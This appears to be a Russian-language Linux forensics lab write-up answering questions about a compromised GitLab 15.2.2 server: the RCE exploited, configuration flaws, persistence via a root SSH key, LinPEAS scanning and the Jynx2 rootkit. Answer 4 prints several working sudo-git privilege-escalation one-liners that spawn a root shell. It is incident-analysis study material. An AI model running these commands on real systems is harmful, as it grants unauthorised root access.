# Linux Forensics

### 1. Какой сервис на данном сервере уязвим? Какая версия?

GitLab, 15.2.2

### 2. Какой тип уязвимости использовал злоумышленник?

Remote Code Execution (RCE) (CVE - CVE-2022-2992)

### 3. Какие ошибки были допущены при конфигурации сервера?

В конфигурации сервера были найдены множественные недочеты, такие как:

    разрешение логина суперпользователю по SSH
    на сайте возможна произвольная иньекция IP-адреса, ведь конфигурация не откидывает X-Forwarded-For;
    доступ к службам без пароля в nginx.conf
    намеренная установка старой версии GitLab
    выдача git sudo без пароля для того “чтобы мои раннеры хорошо работали”

### 4. Как злоумышленник повысил привилегии?

Нами было найдено разрешение пользователю git на запуск команды /usr/bin/git с sudo без запроса пароля.

Таким образом, можно повысить привилегии:

```shell
    a)
    sudo PAGER='sh -c "exec sh 0&lt;&amp;1"' git -p help

    b)

    sudo git -p help config
    !/bin/sh

  c)

    sudo git branch --help config
    !/bin/sh


d)
    TF=$(mktemp -d)
    git init "$TF"
    echo 'exec /bin/sh 0&lt;&amp;2 1&gt;&amp;2' &gt;"$TF/.git/hooks/pre-commit.sample"
    mv "$TF/.git/hooks/pre-commit.sample" "$TF/.git/hooks/pre-commit"
    sudo git -C "$TF" commit --allow-empty -m x

    TF=$(mktemp -d)
    ln -s /bin/sh "$TF/git-x"
    sudo git "--exec-path=$TF" x
```


### 5. Как злоумышленник получил доступ к серверу на постоянной основе?

Злоумышленник прописал свой SSH-ключ в authorized_keys пользователя root.

### 6. Как злоумышленник просканировал систему?

Подразумевая, что под этим подразумевается поиск уязвимостей в системе автоматическим путем, мы нашли следы очистки программного комплекса LinPEAS на машине, который и использовался для сканирования системы.

### 7. С помощью какого ВПО злоумышленник закрепился на сервере?

Злоумышленник закрепился с помощью руткита [https://github.com/chokepoint/Jynx2](https://github.com/chokepoint/Jynx2)


